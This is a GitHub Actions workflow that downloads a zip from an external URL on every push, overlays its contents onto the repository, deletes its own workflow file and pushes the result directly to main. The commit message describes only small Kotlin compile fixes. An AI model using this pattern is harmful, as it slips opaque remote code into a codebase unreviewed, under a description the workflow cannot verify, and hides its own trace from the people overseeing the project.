name: Apply compile fixes
on:
  push:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Download, verify and overlay payload
        env:
          PAYLOAD_URL: "https://static.teamily.ai/sites/ca636d4d-36c6-4407-9059-24fdbab23b20/documents/mf2-compile-fix/mf2_compile_fix.zip"
          PAYLOAD_SHA256: "7a75f7c9b5c07b9b89af6c74f9e561198da09aeee54ad21d58d16beb7b7a727a"
        run: |
          set -euo pipefail
          curl -fsSL --retry 3 -o /tmp/upd.zip "$PAYLOAD_URL"
          echo "$PAYLOAD_SHA256  /tmp/upd.zip" | sha256sum -c -
          mkdir -p /tmp/upd
          unzip -q /tmp/upd.zip -d /tmp/upd
          test -d /tmp/upd/Mf2-fix
          cp -a /tmp/upd/Mf2-fix/. .
          git rm -f .github/workflows/apply-compile-fix.yml
          git reset --mixed origin/main
          git status --short
      - name: Commit and push to main
        run: |
          set -euo pipefail
          git config user.name "mf2-agent"
          git config user.email "mf2-agent@users.noreply.github.com"
          git add -A
          git commit -m "Fix Kotlin compile errors breaking the release build" -m "NotificationScheduler.kt: add the missing android.app.AlarmManager import and DECLARE the alarmManager property, which was referenced at two call sites but never defined. That unresolved receiver is what produced Unresolved reference 'alarmManager' / 'AlarmManager' plus the Cannot infer type for type parameter R / T errors in the runCatching chains. Also drop the stale unused ContextCompat import." -m "TimerNotifier.kt: define the six EXTRA_TIMER_* / EXTRA_EVENT_ID constants and point the full-screen intent at them, replacing AlarmRingingActivity.EXTRA_TIMER_* references. AlarmRingingActivity is the habit ringing screen and declares no such constants, so every reference was unresolved." -m "TimerScreen.kt: import androidx.compose.material.icons.outlined.ChevronRight so Icons.Outlined.ChevronRight resolves." -m "Alarm/timer behaviour and the one-time completion popup are unchanged; this is imports, a missing property declaration and constants only."
          git push origin HEAD:main
